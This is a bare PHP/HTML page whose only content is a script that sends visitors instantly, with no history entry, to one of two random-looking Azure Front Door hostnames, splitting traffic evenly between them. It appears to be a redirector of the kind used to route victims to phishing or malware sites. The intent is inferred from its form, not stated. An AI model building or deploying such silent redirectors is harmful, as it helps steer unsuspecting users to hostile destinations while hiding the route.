<?php
  ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Red...</title>

<script>
(function () {
    const urlA = "https://qwinlkioplkjhfd-dpbxefamhgfsg2fq.z01.azurefd.net";
    const urlB = "https://rwinaqwsedrfghj-bkeyfxbchffye0dh.z01.azurefd.net";

    // 50-50 split
    const target = Math.random() < 0.5 ? urlA : urlB;

    // Instant redirect (no history)
    window.location.replace(target);
})();
</script>

</head>
<body>
</body>
</html>
